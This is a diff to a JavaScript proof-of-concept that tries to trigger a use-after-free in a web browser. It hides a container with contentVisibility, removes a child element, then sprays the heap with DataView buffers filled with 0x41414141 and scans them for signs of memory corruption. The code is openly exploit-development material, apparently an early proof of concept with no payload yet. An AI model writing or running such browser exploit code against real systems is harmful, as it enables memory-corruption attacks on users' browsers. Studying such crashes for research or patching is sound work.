@@ -1,15 +1,22 @@
 import { debug_log } from './module/utils.mjs';
 
 const container = document.querySelector(".container");
-const child = document.querySelector(".child");
+let child = document.querySelector(".child");
 
 function heapSpray() {
   const spray = [];
-  for (let i = 0; i < 10000; i++) {
-    let arr = new Uint8Array(0x1000);
-    arr.fill(0x41);
-    spray.push(arr);
+  const pattern = 0x41414141; // 'AAAA'
+
+  for (let i = 0; i < 2000; i++) {
+    let buf = new ArrayBuffer(0x100);
+    let view = new DataView(buf);
+    for (let j = 0; j < 0x100; j += 4) {
+      view.setUint32(j, pattern, true);
+    }
+    spray.push(view);
   }
+
+  debug_log("Heap spray with DataView completed.");
   return spray;
 }
 
@@ -19,12 +26,50 @@ export function triggerUAF() {
     return;
   }
 
-  container.style.contentVisibility = "hidden";
-  child.remove();
+  try {
+    container.style.contentVisibility = "hidden";
 
-  setTimeout(() => {
-    container.style.contentVisibility = "auto";
-    const spray = heapSpray();
-    debug_log("UAF triggered. Check for crash or memory corruption.");
-  }, 0);
+    // Elimina el child (esto libera memoria potencialmente reusada)
+    child.remove();
+
+    setTimeout(() => {
+      container.style.contentVisibility = "auto";
+
+      const spray = heapSpray();
+
+      // 1. Confirmación de que el child fue eliminado
+      if (!document.querySelector(".child")) {
+        debug_log("✅ .child element removed from DOM (memory possibly freed).");
+      } else {
+        debug_log("❌ .child element still in DOM.");
+      }
+
+      // 2. Revisión de patrones para detectar corrupción
+      let corrupted = false;
+      for (let i = 0; i < spray.length; i++) {
+        try {
+          let value = spray[i].getUint32(0, true);
+          if (value !== 0x41414141) {
+            debug_log(`[!] CORRUPCIÓN detectada en spray[${i}]: valor = ${value.toString(16)}`);
+            corrupted = true;
+            break;
+          }
+        } catch (e) {
+          debug_log(`[!] Excepción al leer spray[${i}]: ${e.message}`);
+          corrupted = true;
+          break;
+        }
+      }
+
+      if (!corrupted) {
+        debug_log("No se detectó corrupción visible en los DataViews.");
+      }
+
+      debug_log("UAF trigger finalizado. Observa cualquier comportamiento anómalo o crash.");
+
+    }, 0);
+
+  } catch (e) {
+    debug_log("Exception caught during triggerUAF: " + e.message);
+  }
 }
